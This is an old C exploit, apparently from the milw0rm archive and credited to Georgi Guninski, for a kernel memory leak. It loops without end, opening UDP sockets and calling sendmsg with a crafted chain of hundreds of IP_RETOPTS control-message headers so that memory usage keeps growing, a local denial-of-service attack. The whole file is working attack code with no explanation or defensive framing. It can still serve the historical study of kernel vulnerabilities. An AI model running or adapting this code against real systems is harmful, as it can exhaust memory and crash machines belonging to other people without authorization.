/* memory leak
 * Copyright Georgi Guninski
 * Cannot be used in vulnerability databases (like securityfocus and mitre)
 * */
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int ac,char **av)
{
struct msghdr msghdr;
struct iovec iovector[10];
int i,s,j,ma;
struct sockaddr_in sockad;
char msg[128];
struct cmsghdr *cmsg,*cm2;
char opts[24];

ma=250;
printf("just wait and watch memory usage\n");

memset(opts,0,sizeof(opts));

while(42)
{
s=socket(PF_INET, /*SOCK_STREAM*/ SOCK_DGRAM, 0);
sockad.sin_family = AF_INET;
sockad.sin_addr.s_addr=inet_addr("127.0.0.1");
sockad.sin_port=htons(8080);

connect(s,(struct sockaddr *) &sockad, sizeof(sockad));

memset(msg,'v',sizeof(msg));
#define VV (ma*(sizeof(struct cmsghdr)+sizeof(opts))+1024*1024)
cmsg = malloc(VV);
memset(cmsg,0,VV);
cmsg->cmsg_len = sizeof(struct cmsghdr) + sizeof(opts);
cmsg->cmsg_level = SOL_IP;
cmsg->cmsg_type = IP_RETOPTS;
memcpy(CMSG_DATA(cmsg), opts, sizeof(opts));

cm2= (struct cmsghdr *) (long) ((char *)CMSG_DATA(cmsg)+sizeof(opts));
for(j=0;j<ma;j++)
{
cm2->cmsg_level = SOL_IP;
cm2->cmsg_type = IP_RETOPTS;
cm2->cmsg_len =  sizeof(struct cmsghdr) + sizeof(opts);
cm2= (struct cmsghdr *) (long) ((char *)CMSG_DATA(cm2)+sizeof(opts));
}

cm2->cmsg_level = SOL_IP;
cm2->cmsg_type = IP_RETOPTS;
cm2->cmsg_len =  sizeof(struct cmsghdr) + 8;

msghdr.msg_name = &sockad;
msghdr.msg_namelen = sizeof(sockad);

msghdr.msg_control=cmsg;
msghdr.msg_controllen= cmsg->cmsg_len + (j)*cmsg->cmsg_len+cm2->cmsg_len;
msghdr.msg_iov = iovector;

msghdr.msg_iovlen = 1;
iovector[0].iov_base = msg;
iovector[0].iov_len = sizeof(msg);

if ((i = sendmsg(s, &msghdr, 0)) < 0)
{perror("sendmsg");return -42;}

close(s);
free(cmsg);
}
return 42;
}

// milw0rm.com [2004-12-16]